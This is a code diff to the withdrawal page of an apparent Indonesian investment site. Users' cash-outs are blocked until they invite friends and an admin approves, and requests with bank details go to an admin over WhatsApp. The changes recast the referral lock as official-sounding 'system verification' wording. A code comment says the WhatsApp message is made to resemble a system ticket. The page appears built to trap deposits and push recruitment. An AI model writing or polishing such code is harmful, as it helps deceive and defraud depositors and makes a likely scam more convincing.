@@ -189,13 +189,20 @@
             background-color: var(--accent-red-bg);
             border: 1px solid #fecaca;
             color: var(--accent-red);
-            padding: 12px;
+            padding: 14px;
             border-radius: var(--radius-md);
             font-size: 0.85rem;
-            font-weight: 600;
+            font-weight: 500;
+            line-height: 1.4;
             margin-bottom: 16px;
-            text-align: center;
+            text-align: left;
             display: none;
+        }
+
+        .alert-box strong {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 4px;
         }
 
         .btn-group {
@@ -273,7 +280,8 @@
             <div id="display-nominal-wd" class="nominal-val">Rp 0</div>
 
             <div id="alert-referral" class="alert-box">
-                Akses penarikan saldo Anda saat ini terkunci. Silakan selesaikan syarat undang teman terlebih dahulu!
+                <strong>PEMBERITAHUAN SISTEM:</strong>
+                Akses pencairan dana Anda saat ini ditangguhkan sementara. Mohon selesaikan prosedur verifikasi program kemitraan (Undang Teman) untuk membuka pembatasan sistem.
             </div>
 
             <form id="form-penarikan-detail">
@@ -304,18 +312,18 @@
                 </div>
 
                 <div class="instructions">
-                    <h4>Ketentuan Penarikan:</h4>
+                    <h4>Ketentuan & Kebijakan Transaksi:</h4>
                     <ul>
-                        <li>Wajib memenuhi syarat status undang teman yang dibuka oleh admin untuk membuka kunci penarikan.</li>
-                        <li>Pastikan data rekening / e-wallet sudah benar.</li>
-                        <li>Proses verifikasi dan pencairan dana memerlukan waktu 1-3 hari kerja.</li>
+                        <li>Pengguna wajib memenuhi ketentuan status program kemitraan untuk membuka pembatasan penarikan dana.</li>
+                        <li>Pastikan validitas data rekening atau dompet digital yang diinput sudah sesuai demi menghindari kegagalan transfer.</li>
+                        <li>Proses verifikasi manual dan pencairan dana membutuhkan estimasi waktu 1 hingga 3 hari kerja (hari operasional).</li>
                     </ul>
                 </div>
 
                 <div class="btn-group">
                     <button type="submit" id="btn-submit" class="btn btn-red">Ajukan Penarikan</button>
-                    <a href="undang.html" id="btn-undang" class="btn btn-red" style="display: none; background-color: var(--accent-brand);">Undang Teman Sekarang</a>
-                    <a href="investasi.html" class="btn btn-outline">Batal / Kembali</a>
+                    <a href="undang.html" id="btn-undang" class="btn btn-red" style="display: none; background-color: var(--accent-brand);">Verifikasi Kemitraan Sekarang</a>
+                    <a href="investasi.html" class="btn btn-outline">Batalkan / Kembali</a>
                 </div>
             </form>
         </section>
@@ -353,7 +361,6 @@
             }
             currentUser = user;
             
-            // Periksa statusUndangTeman dari Firestore dokumen portfolios pengguna
             const alertBox = document.getElementById('alert-referral');
             const submitBtn = document.getElementById('btn-submit');
             const undangBtn = document.getElementById('btn-undang');
@@ -378,7 +385,7 @@
                     });
                 }
             } catch (error) {
-                console.error("Gagal memeriksa status undang teman:", error);
+                console.error("Gagal memeriksa status verifikasi:", error);
             }
         });
 
@@ -400,7 +407,7 @@
             formWdDetail.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 if (!currentUser) {
-                    alert('Silakan masuk terlebih dahulu.');
+                    alert('Sesi Anda telah berakhir. Silakan masuk kembali ke akun Anda.');
                     window.location.href = 'login.html';
                     return;
                 }
@@ -414,7 +421,7 @@
                     }
 
                     if (statusUndangTeman !== 'sudah') {
-                        alert('Akses penarikan belum dibuka oleh admin!');
+                        alert('Peringatan Sistem: Akses penarikan dana Anda saat ini belum diotorisasi oleh admin.');
                         return;
                     }
                 } catch (err) {
@@ -422,7 +429,7 @@
                 }
 
                 if (nominalPenarikan <= 0) {
-                    alert('Nominal penarikan tidak valid.');
+                    alert('Nominal penarikan tidak valid. Mohon periksa kembali portofolio Anda.');
                     return;
                 }
 
@@ -432,12 +439,12 @@
                 const submitBtn = document.getElementById('btn-submit');
 
                 if (!bankTujuan || !noRekening || !namaPemilik) {
-                    alert('Harap lengkapi semua data penarikan.');
+                    alert('Formulir belum lengkap. Harap mengisi seluruh data penarikan dengan benar.');
                     return;
                 }
 
                 submitBtn.disabled = true;
-                submitBtn.textContent = 'Menyimpan & Mengarahkan ke WhatsApp...';
+                submitBtn.textContent = 'Menyimpan & Mengarahkan ke Pusat Layanan...';
 
                 const waktuSekarang = new Date().toLocaleString('id-ID', {
                     day: '2-digit', month: '2-digit', year: 'numeric',
@@ -455,19 +462,24 @@
                         createdAt: new Date().toISOString()
                     });
                 } catch (error) {
-                    console.error("Gagal menyimpan transaksi ke Firestore:", error);
+                    console.error("Gagal menyimpan transaksi ke basis data:", error);
                 }
 
                 const adminWhatsAppNumber = "6281234567890"; 
 
-                const pesan = `Halo Admin, saya ingin mengajukan penarikan saldo:\n\n` +
-                              `*User ID:* ${currentUser.uid}\n` +
-                              `*Email:* ${currentUser.email || 'Tidak ada'}\n` +
-                              `*Total Nominal:* ${formatRupiah(nominalPenarikan)}\n` +
-                              `*Bank / E-Wallet:* ${bankTujuan}\n` +
-                              `*No. Rekening / Tujuan:* ${noRekening}\n` +
-                              `*Nama Pemilik:* ${namaPemilik}\n\n` +
-                              `Mohon diproses, terima kasih.`;
+                // Format Pesan WhatsApp yang dibuat lebih resmi menyerupai tiket sistem
+                const pesan = `*FORMULIR PENGAJUAN PENARIKAN DANA*\n` +
+                              `-- Sistem Bengkulu Investasi --\n\n` +
+                              `Yth. Tim Layanan Pelanggan,\n` +
+                              `Berikut adalah rincian pengajuan penarikan dana dari akun terdaftar:\n\n` +
+                              `• *ID Pengguna:* ${currentUser.uid}\n` +
+                              `• *Email:* ${currentUser.email || 'Tidak tersedia'}\n` +
+                              `• *Nominal Penarikan:* ${formatRupiah(nominalPenarikan)}\n` +
+                              `• *Metode:* ${bankTujuan}\n` +
+                              `• *Nomor Rekening/Tujuan:* ${noRekening}\n` +
+                              `• *Nama Pemilik:* ${namaPemilik}\n` +
+                              `• *Waktu Pengajuan:* ${waktuSekarang}\n\n` +
+                              `Mohon segera diproses dan diverifikasi sesuai ketentuan yang berlaku. Terima kasih.`;
 
                 const encodedMessage = encodeURIComponent(pesan);
                 const whatsappUrl = `https://wa.me/${adminWhatsAppNumber}?text=${encodedMessage}`;
